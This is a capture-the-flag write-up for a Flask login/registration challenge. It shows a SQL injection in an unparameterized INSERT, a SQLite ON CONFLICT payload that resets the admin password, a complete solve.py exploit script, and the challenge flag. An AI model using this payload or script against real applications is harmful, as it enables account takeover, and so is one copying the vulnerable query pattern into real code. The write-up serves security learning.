![image](https://github.com/user-attachments/assets/2402148d-a881-470e-8cfd-8ad8fe95c36d)

**Author:** RJCyber  
**Source:** 

The website initially presented a basic login and registration form.

![image](https://github.com/user-attachments/assets/080d6886-b6ae-41ae-8ca2-d8b6f7075d3b)

While testing the application with various inputs, I discovered a potential vulnerability. Entering a simple payload like `hello'` caused the `/register` route to respond with a **500 Internal Server Error**.

This error indicated a possible SQL Injection vulnerability, suggesting that unsanitized user inputs could be directly inserted into the SQL query.

### Code Review

Upon reviewing the source code, I confirmed the SQL injection vulnerability in the `/register` route:

![image](https://github.com/user-attachments/assets/f03534aa-68bf-4f24-88ed-6c736d060cfe)

```python
cursor.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{generate_password_hash(password)}')")
```

In this snippet, user inputs (`username` and `password`) are directly embedded in the SQL query string, without parameterization or input sanitization, allowing for malicious SQL command injection.

### Flag Location

Upon further inspection, I found that the **flag** is accessible only through the `admin` account. The `/dashboard` route contains the logic for displaying the flag:

```python
@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect('/login')

    username = session['username']
    cursor = get_db().cursor()

    if username == 'admin':
        cursor.execute("SELECT flag FROM flags")
        flag = cursor.fetchone()['flag']
        return render_template('dashboard.html', username=username, flag=flag)

    return render_template('dashboard.html', username=username, flag=None)
```

#### How the Flag Is Displayed

- **Admin Privilege Requirement**: If the logged-in user is `admin`, the application queries the `flags` table to retrieve the flag.
  ```python
  cursor.execute("SELECT flag FROM flags")
  flag = cursor.fetchone()['flag']
  ```

- **Conditional Display**: The flag is conditionally rendered in the HTML template:
![image](https://github.com/user-attachments/assets/24509473-0dc2-4d0f-b1f6-2d11db2ac56a)

To access the flag, we need to log in as the `admin` user. Since we don’t know the admin password, we can utilize SQL injection to manipulate authentication and access the `dashboard` as the `admin`.

### Exploitation

Through research, I discovered a method in SQLite3 using `ON CONFLICT DO UPDATE`. This allows us to update the admin password directly during registration if the username already exists.

We can use the following payload as the username during registration:

```sql
admin', 'meow') ON CONFLICT(username) DO UPDATE SET password = 'new_password';--
```

**How It Works**:

1. The first part (`admin', 'meow')`) closes the `INSERT` statement.
2. `ON CONFLICT(username)` triggers when trying to insert an existing admin user.
3. The password is updated to `new_password`.

### Solution Script: solve.py

```python
#!/usr/bin/env python3
import requests
from werkzeug.security import generate_password_hash

url = 'https://usc-spookyql.chals.io/1ef2ec1d-b8ba-44ec-8f5d-7d07ebcd598e'

def register_user(payload):
    response = requests.post(url + '/register', data={'username': payload, 'password': 'password'})
    return response

def login_user(username, password):
    response = requests.post(url + '/login', data={'username': username, 'password': password})
    return response

payload = f"""admin', 'meow') ON CONFLICT(username) DO UPDATE SET password = '{generate_password_hash('achuxer')}'; --"""

response = register_user(payload)
print("[*] Response code: ", response.status_code)

print("[*] Logging in as admin")
response = login_user('admin', 'achuxer')
print(response.text)
```

After executing this, we can log in with the new credentials and access the `/dashboard` route to retrieve the flag.

**FLAG:** `CYBORG{Wh4t_h4pp3n3d_t0_my_p4ssw0rd!}`

